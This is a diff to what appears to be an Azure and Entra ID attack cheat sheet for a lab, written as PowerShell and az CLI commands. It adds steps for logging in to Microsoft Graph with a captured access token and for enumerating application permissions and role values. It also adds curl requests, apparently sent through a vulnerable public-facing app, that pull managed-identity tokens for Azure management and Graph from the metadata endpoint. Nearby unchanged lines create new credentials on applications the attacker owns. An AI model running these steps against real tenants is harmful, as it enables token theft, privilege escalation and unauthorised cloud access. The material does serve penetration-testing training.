@@ -162,6 +162,7 @@ PS> Connect-AzAccount -AccessToken <AADAccessToken>
 
 # Authentication using Username + Password
 PS> Connect-MgGraph -Scopes "Directory.Read.All"
+PS> Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)
 
 # Enumeration
 # Check if target organization is using Entra ID as a IDP [Identity Provider] 
@@ -243,9 +244,15 @@ PS> Get-MgApplication -Filter "startswith(displayName,'prod-app')"
 PS> Get-MgApplicationOwner -ApplicationId "AppObjectID" | ConvertTo-Json
 # As an app owner, create an application credential. 
 PS> Add-MgApplicationPassword -ApplicationId "AppObjectID" | ConvertTo-Json
+# Get the required resource access to specific App
+PS> $app= Get-MgApplication -ApplicationId [AppObjectID]
+PS> $app.requiredResourceAccess | ConvertTo-Json
 # Check the directory role assigned to prod application.
 PS> Get-MgDirectoryRolememberasServicePrincipal -DirectoryRoleId 
 664f8b57-19df-4893-91f2-6657c3d27b5c | ConvertTo-json
+# Find Role value
+PS> $res=Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
+PS> $res.AppRoles | Where-Object {$_.ID -eq '[RoleId]'} | ConvertTo-Json
 
 # Get all the role assignment “auditor” user have on azure subscription 
 PS> az role assignment list --assignee 'auditor@atomic-nuclear.site' --all
@@ -253,7 +260,8 @@ PS> az role assignment list --assignee 'auditor@atomic-nuclear.site' --all
 PS> az vm list
 PS> az vm list-ip-addresses --name prod-vm --resource-group PROD-RG
 # Exploit public facing application and retrieve access token of managed identity attached to vm
-PS> curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+PS> curl -H "Metadata:true" "http://website/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+PS> curl -H "Metadata:true" "http://website/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
 # Configure access token in az powershell cli 
 PS> $token = “AccessToken”
 PS> Connect-AzAccount -AccessToken $token -AccountId [Subscription ID]
